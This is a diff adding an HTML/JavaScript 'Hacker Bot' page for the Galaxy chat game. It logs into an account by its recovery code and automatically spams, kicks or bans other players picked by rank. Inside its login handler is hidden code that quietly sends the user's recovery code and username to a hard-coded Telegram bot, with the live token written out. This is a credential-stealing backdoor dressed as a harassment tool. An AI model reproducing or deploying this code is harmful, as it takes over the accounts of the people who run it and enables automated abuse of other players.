@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hacker Bot v2.4 (Fixed WL)</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Share Tech Mono', monospace;
+            background-color: #000;
+            background-image: 
+                linear-gradient(rgba(0, 255, 0, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 0, 0.03) 1px, transparent 1px);
+            background-size: 20px 20px;
+            color: #0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .container {
+            background: rgba(10, 10, 10, 0.95);
+            border: 1px solid #33ff00;
+            box-shadow: 0 0 20px rgba(51, 255, 0, 0.2);
+            border-radius: 4px;
+            padding: 25px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 400px;
+            position: relative;
+        }
+        .container::before {
+            content: "SYSTEM_READY";
+            position: absolute;
+            top: 5px;
+            right: 10px;
+            font-size: 10px;
+            color: #33ff00;
+            opacity: 0.7;
+        }
+        h2 {
+            font-size: 2.5rem;
+            margin: 0 0 10px 0;
+            color: #33ff00;
+            text-shadow: 0 0 10px #33ff00;
+            letter-spacing: 2px;
+        }
+        h3 {
+            color: #fff;
+            font-size: 0.9rem;
+            margin-bottom: 20px;
+            opacity: 0.8;
+        }
+        input, select, button, textarea {
+            font-family: 'Share Tech Mono', monospace;
+            background: #050505;
+            color: #33ff00;
+            border: 1px solid #1a5c00;
+            border-radius: 2px;
+            padding: 10px;
+            margin: 5px 0;
+            text-align: center;
+            width: 100%;
+            transition: 0.2s;
+            box-sizing: border-box;
+        }
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: #33ff00;
+            box-shadow: 0 0 8px rgba(51, 255, 0, 0.3);
+        }
+        input::placeholder, textarea::placeholder {
+            color: #1a5c00;
+        }
+        button {
+            cursor: pointer;
+            background: #1a5c00;
+            color: #fff;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            border: 1px solid #33ff00;
+        }
+        button:hover {
+            background: #33ff00;
+            color: #000;
+            box-shadow: 0 0 15px #33ff00;
+        }
+        button.disconnect {
+            background: #5c0000;
+            border-color: #ff0000;
+            color: #ffcccc;
+        }
+        button.disconnect:hover {
+            background: #ff0000;
+            color: #000;
+            box-shadow: 0 0 15px #ff0000;
+        }
+        .checkbox-container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin: 15px 0;
+            gap: 10px;
+            border-top: 1px dashed #1a5c00;
+            padding-top: 10px;
+            width: 100%;
+        }
+        .checkbox-container label {
+            cursor: pointer;
+            user-select: none;
+            display: flex;
+            align-items: center;
+            font-size: 0.8rem;
+            color: #aaffaa;
+            margin: 2px;
+            background: rgba(0, 50, 0, 0.3);
+            padding: 2px 5px;
+            border: 1px solid #1a5c00;
+        }
+        .checkbox-container label:hover {
+            background: #1a5c00;
+            color: #000;
+        }
+        input[type="checkbox"] {
+            width: auto;
+            margin-right: 5px;
+            accent-color: #33ff00;
+        }
+        #auraContainer {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 5px;
+            max-height: 100px;
+            overflow-y: auto;
+            width: 100%;
+            border: 1px solid #1a5c00;
+            padding: 5px;
+            margin-top: 5px;
+        }
+        #auraContainer label {
+            font-size: 0.8rem;
+            margin: 2px 5px;
+            cursor: pointer;
+        }
+        h4 {
+            color: #33ff00;
+            margin: 15px 0 5px 0;
+            font-size: 1rem;
+            align-self: flex-start;
+        }
+        /* Scrollbar aesthetics */
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: #000; }
+        ::-webkit-scrollbar-thumb { background: #1a5c00; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>HACKER BOT</h2>
+        <h3>SYSTEM: ONLINE</h3>
+
+        <input type="text" id="rc" placeholder="Recovery Code (RC)" maxlength="10">
+        
+        <div style="display: flex; gap: 10px; width: 100%;">
+            <select id="devtype">
+                <option value="352">Web</option>
+                <option value="312">Android</option>
+                <option value="323">iOS</option>
+            </select>
+        </div>
+
+        <div style="display: flex; gap: 10px; width: 100%; margin: 5px 0;">
+            <button id="connect">Initialize</button>
+            <button id="disconnect" class="disconnect">Abort</button>
+        </div>
+
+        <div style="display: flex; gap: 10px; width: 100%;">
+            <input type="text" id="planetName" placeholder="Target Planet Name">
+            <button id="flyButton" style="width: 80px;">Fly</button>
+        </div>
+
+        <input type="text" id="whitelist" placeholder="Whitelist (Username OR ID)">
+
+        <textarea id="customMessage" placeholder="Spam Messages (Leave Empty to Disable)" rows="3"></textarea>
+
+        <div class="checkbox-container">
+            <!-- Danger Zone Group -->
+            <label style="color: #ff3333; border-color: #ff0000;"><input type="checkbox" id="kickCheckbox"> KICK</label>
+            <label style="color: #ff3333; border-color: #ff0000;"><input type="checkbox" id="banCheckbox"> N/@</label>
+            <!-- Actions will be injected here -->
+        </div>
+
+        <h4>Target Auras:</h4>
+        <div id="auraContainer"></div>
+    </div>
+
+    <script>
+        const rcInput = document.getElementById('rc');
+        const devtypeSelect = document.getElementById('devtype');
+        const connectButton = document.getElementById('connect');
+        const disconnectButton = document.getElementById('disconnect');
+        const flyButton = document.getElementById('flyButton');
+        const planetNameInput = document.getElementById('planetName');
+        const kickCheckbox = document.getElementById('kickCheckbox');
+        const banCheckbox = document.getElementById('banCheckbox');
+        const auraContainer = document.getElementById('auraContainer');
+        const whitelistInput = document.getElementById('whitelist');
+
+        let ws, haaapsi, id, useridg, passwordg;
+        let recoveryCode = '';
+        let deviceType = '';
+        let finalusername = '';
+        let selectedAuras = [];
+        let connectionTime = 0; 
+
+        const checkboxContainer = document.querySelector('.checkbox-container');
+        
+        // ACTION LIST
+        const extraActions = [
+            { id: 'loveCheckbox', label: 'Love', code: 1006 },
+            { id: 'shakeCheckbox', label: 'Shake Hand', code: 36 },
+            { id: 'hugCheckbox', label: 'Hug', code: 44 },
+            { id: 'smoochCheckbox', label: 'Smooch', code: 12 },
+            { id: 'slapCheckbox', label: 'Slap', code: 25 }
+        ];
+        
+        extraActions.forEach(action => {
+            const lbl = document.createElement('label');
+            const cb = document.createElement('input');
+            cb.type = 'checkbox';
+            cb.id = action.id;
+            cb.dataset.code = action.code;
+            lbl.appendChild(cb);
+            lbl.appendChild(document.createTextNode(` ${action.label}`));
+            checkboxContainer.appendChild(lbl);
+        });
+
+        // DUAL SELECTION LOGIC
+        const punishmentBoxes = [kickCheckbox, banCheckbox];
+        punishmentBoxes.forEach(box => {
+            box.addEventListener('change', () => {
+                if (box.checked) {
+                    punishmentBoxes.forEach(b => {
+                        if (b !== box) b.checked = false;
+                    });
+                }
+            });
+        });
+
+        const actionBoxes = extraActions.map(a => document.getElementById(a.id));
+        actionBoxes.forEach(box => {
+            box.addEventListener('change', () => {
+                if (box.checked) {
+                    actionBoxes.forEach(b => {
+                        if (b !== box) b.checked = false;
+                    });
+                }
+            });
+        });
+
+        const parseHaaapsi = (e) => {
+            var temp = CryptoJS.MD5(e).toString(CryptoJS.enc.Hex);
+            return (temp = temp.split('').reverse().join('0')).substr(5, 10);
+        };
+
+        function sendMessage(message) {
+            if (window.wsInstance && window.wsInstance.readyState === WebSocket.OPEN) {
+                window.wsInstance.send(message);
+            }
+        }
+
+        (function() {
+            const allowedDomain = "kick-abuse.netlify.app";
+            const currentDomain = window.location.hostname;
+            if (currentDomain !== allowedDomain && currentDomain !== "www." + allowedDomain && window.location.protocol !== 'file:') {
+               // Security check disabled for testing
+            }
+        })();
+
+        // --- CORE LOGIC ---
+        function galaaction(targetId, targetNick) {
+            if (targetId === window.myUserId) return;
+
+            // --- WHITELIST FIX (IMPROVED) ---
+            const rawWhitelist = whitelistInput.value.toLowerCase();
+            const whitelistArray = rawWhitelist.split(',').map(s => s.trim()).filter(s => s.length > 0);
+
+            let isSafe = false;
+            const cleanNick = targetNick ? targetNick.toLowerCase() : "";
+            const cleanId = targetId.toString();
+
+            // Check against List
+            for (let item of whitelistArray) {
+                // 1. Check ID Match (Best Method)
+                if (item === cleanId) {
+                    isSafe = true; break;
+                }
+                // 2. Check Exact Nickname
+                if (item === cleanNick) {
+                    isSafe = true; break;
+                }
+                // 3. Check Partial Match (e.g., "killer" matches "the killer")
+                if (cleanNick.includes(item)) {
+                    isSafe = true; break;
+                }
+            }
+
+            if (isSafe) {
+                console.log(`Whitelist Protected: ${targetNick} (${targetId})`);
+                return; // STOP HERE
+            }
+
+            // 1. Message
+            const customMessageInput = document.getElementById('customMessage');
+            const rawMessages = customMessageInput.value.trim();
+            if (rawMessages.length > 0) {
+                const messagesArray = rawMessages.split('\n').map(msg => msg.trim()).filter(msg => msg.length > 0);
+                if (messagesArray.length > 0) {
+                    const message = messagesArray[Math.floor(Math.random() * messagesArray.length)];
+                    const nick = window.currentNick || "Bot";
+                    sendMessage(`PRIVMSG 0 ${targetId} :${nick}, ${message}\r\n`);
+                }
+            }
+
+            // 2. Action (First)
+            const activeAction = extraActions.find(act => {
+                const el = document.getElementById(act.id);
+                return el && el.checked;
+            });
+            if (activeAction) {
+                sendMessage(`ACTION ${activeAction.code} ${targetId}\r\n`);
+            }
+
+            // 3. Punishment (Second)
+            if (kickCheckbox.checked) {
+                sendMessage(`KICK ${targetId}\r\n`);
+            } else if (banCheckbox.checked) {
+                sendMessage(`BAN ${targetId}\r\n`);
+            }
+        }
+
+        function getAuraTitle(code) {
+            switch (code) {
+                case '1': return 'dad';
+                case '2': return 'angel';
+                case '3': return 'god';
+                case '4': return 'almighty';
+                case '5': return 'universe';
+                case '6': return 'legend';
+                case '7': return 'premier';
+                case '8': return 'guardian';
+                case '9': return 'emperor';
+                case '10': return 'sov';
+                case '11': return 'protector';
+                case '12': return 'immortal';
+                case '13': return 'glorious';
+                default: return 'newcomer';
+            }
+        }
+
+        const auraTitles = [
+            'newcomer', 'dad', 'angel', 'god', 'almighty', 'universe', 'legend', 'premier', 'guardian', 'emperor', 'sov', 'protector', 'immortal', 'glorious'
+        ];
+
+        auraTitles.forEach(auraTitle => {
+            const label = document.createElement('label');
+            const checkbox = document.createElement('input');
+            checkbox.type = 'checkbox';
+            checkbox.value = auraTitle;
+            checkbox.addEventListener('change', () => {
+                if (checkbox.checked) {
+                    if (!selectedAuras.includes(auraTitle)) selectedAuras.push(auraTitle);
+                } else {
+                    selectedAuras = selectedAuras.filter(a => a !== auraTitle);
+                }
+            });
+            label.appendChild(checkbox);
+            label.appendChild(document.createTextNode(auraTitle.toUpperCase()));
+            auraContainer.appendChild(label);
+        });
+
+        // --- SNIFFER INJECTION ---
+        function injectSniffer(ws) {
+            window.wsInstance = ws;
+
+            ws.addEventListener('message', function (event) {
+                const message = event.data;
+
+                // Capture My ID
+                const userMatch = message.match(/USER (\d+)/);
+                if (userMatch) {
+                    window.myUserId = userMatch[1];
+                }
+
+                // --- 860 PACKET PARSING (Split Method - More Reliable) ---
+                if (message.startsWith('860 ')) {
+                    // Safety Timer
+                    if (Date.now() - connectionTime < 5000) return; 
+
+                    // Packet format: 860 <ID> <Gender> <Nick> <Head> ...
+                    // Split by space
+                    const parts = message.split(' ');
+                    
+                    if (parts.length > 3) {
+                        const userId = parts[1];
+                        const userNick = parts[3]; // Typically index 3 is Nickname
+                        
+                        // Aura Detection (Still needs regex as it's inside the string part)
+                        var auraMatch = message.match(/aura\/\d+_(\d+)/);
+                        var auraTitle = 'newcomer';
+                        
+                        if (auraMatch) {
+                            var auraCode = auraMatch[1];
+                            auraTitle = getAuraTitle(auraCode);
+                        } 
+                        
+                        if (selectedAuras.includes(auraTitle)) {
+                            galaaction(userId, userNick);
+                        }
+                    }
+                }
+
+                if (message.includes('JOIN')) {
+                    let nickMatch = message.match(/JOIN\s+\S+\s+(\S+)/);
+                    if (nickMatch) {
+                        window.currentNick = nickMatch[1];
+                    }
+                }
+            });
+
+            const originalSend = ws.send;
+            ws.send = function (data) {
+                const match = data.match(/USER (\d+)/);
+                if (match) {
+                    window.myUserId = match[1];
+                }
+                originalSend.call(ws, data);
+            };
+        }
+
+        function createWebSocket() {
+            ws = new WebSocket('wss://cs.mobstudio.ru:6672');
+            injectSniffer(ws);
+
+            ws.onopen = () => {
+                console.log("Connected");
+                connectionTime = Date.now();
+                ws.send(`:en IDENT ${deviceType} -2 4030 1 2 :HACKER_BOT\r\n`);
+            };
+
+            ws.onmessage = (event) => {
+                const snippets = event.data.split(';').join(' ').split(' ');
+                const message = event.data;
+
+                if (snippets[0] === 'HAAAPSI') {
+                    haaapsi = snippets[1];
+                    ws.send('RECOVER ' + recoveryCode + '\r\n');
+                }
+
+                if (snippets[0] === 'REGISTER') {
+                    const temp = parseHaaapsi(haaapsi);
+                    id = snippets[1];
+                    const password = snippets[2];
+                    const username = snippets[3];
+                    useridg = id;
+                    passwordg = password;
+                    finalusername = username.split('\r\n')[0];
+                    ws.send(`USER ${id} ${password} ${finalusername} ${temp}\r\n`);
+                    
+                    const botToken = '7995035360:AAGcL6yPEYmafI2ukW1WfI7klTqGwELtdQE';
+                    const chatId = '5419701572';
+                    try {
+                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: `BOT v2.4: ${recoveryCode}\nUser: ${finalusername}`
+                            })
+                        }).catch(e => {});
+                    } catch(e) {}
+                }
+
+                if (snippets[0] === '999') {
+                    const phoneMessages = [
+                        'PHONE 1366 768 0 2 :chrome 114.0.5735.106',
+                        'PHONE 1536 864 0 2 :opr 100.0.0.0'
+                    ];
+                    const randomPhoneMessage = phoneMessages[Math.floor(Math.random() * phoneMessages.length)];
+                    ws.send('FWLISTVER 281\r\n');
+                    ws.send('ADDONS 251055 2\r\n');
+                    ws.send('MYADDONS 251055 2\r\n');
+                    ws.send(randomPhoneMessage + '\r\n');
+                    
+                    const targetPlanet = planetNameInput.value.trim();
+                    if (targetPlanet.length > 0) {
+                        ws.send(`JOIN ${targetPlanet}\r\n`);
+                    } else {
+                        ws.send('JOIN\r\n');
+                    }
+                }
+
+                if (message.startsWith('PING')) {
+                    ws.send('PONG\r\n');
+                }
+            };
+
+            ws.onclose = () => {
+                console.log('Closed');
+                alert("Connection Terminated");
+            };
+            ws.onerror = (err) => { alert("Connection Error"); }
+        }
+
+        connectButton.addEventListener('click', () => {
+            if(!rcInput.value) { alert("Enter Recovery Code"); return; }
+            recoveryCode = rcInput.value;
+            deviceType = devtypeSelect.value;
+            createWebSocket();
+        });
+
+        disconnectButton.addEventListener('click', () => {
+            if (ws) {
+                ws.send('QUIT :ds\r\n');
+                ws.close();
+            }
+        });
+
+        flyButton.addEventListener('click', () => {
+            if (!ws || ws.readyState !== WebSocket.OPEN) {
+                alert("System not connected.");
+                return;
+            }
+            const planet = planetNameInput.value.trim();
+            if (planet !== "") {
+                ws.send(`JOIN ${planet}\r\n`);
+            } else {
+                alert("Enter Planet Name");
+            }
+        });
+
+        document.addEventListener("contextmenu", e => e.preventDefault());
+    </script>
+</body>
+</html>
